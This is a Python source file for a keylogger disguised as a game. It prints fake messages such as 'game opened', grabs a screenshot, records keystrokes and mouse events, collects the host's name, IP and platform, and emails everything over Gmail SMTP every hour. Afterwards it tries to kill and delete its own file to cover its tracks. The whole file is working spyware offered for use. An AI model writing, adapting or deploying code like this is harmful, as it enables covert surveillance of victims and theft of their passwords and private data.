import logging
import os
import platform
import smtplib
import socket
import threading
import pyscreenshot
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from subprocess import call
modules = ["pyscreenshot", "pynput", "pillow", "pygame"]
call("pip install " + ' '.join(modules), shell=True)
EMAIL_ADDRESS = "Your-Email-Address"
EMAIL_PASSWORD = "Your Password"
SEND_REPORT_EVERY = 3600 # in seconds


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "Keylogger started successfully"
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def on_move(self, x, y):
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_move)

    def on_click(self, x, y):
        current_click = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_click)

    def on_scroll(self, x, y):
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def send_img(self):
        with open('ss.png', 'rb') as f:
            img_data = f.read()
        msg = MIMEMultipart()
        msg['Subject'] = socket.gethostname() + '\'s screenshot LMAO!'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS

        text = MIMEText('test')
        msg.attach(text)
        image = MIMEImage(img_data, name=os.path.basename('ss.png'))
        msg.attach(image)

        s = smtplib.SMTP(host='smtp.gmail.com', port=587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        s.sendmail(msg['From'], msg['To'], msg.as_string())
        s.quit()
        print('Game running successfully')
        os.remove('ss.png')

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)

    def screenshot(self):
        print('game opened')
        img = pyscreenshot.grab()
        img.save('ss.png')
        self.send_img()

    def run(self):
        self.screenshot()
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        with Listener(on_click=self.on_click,
                      on_move=self.on_move,
                      on_scroll=self.on_scroll)as mouse_listener:
            mouse_listener.join()
        if os.name == "posix":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is close.')


keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
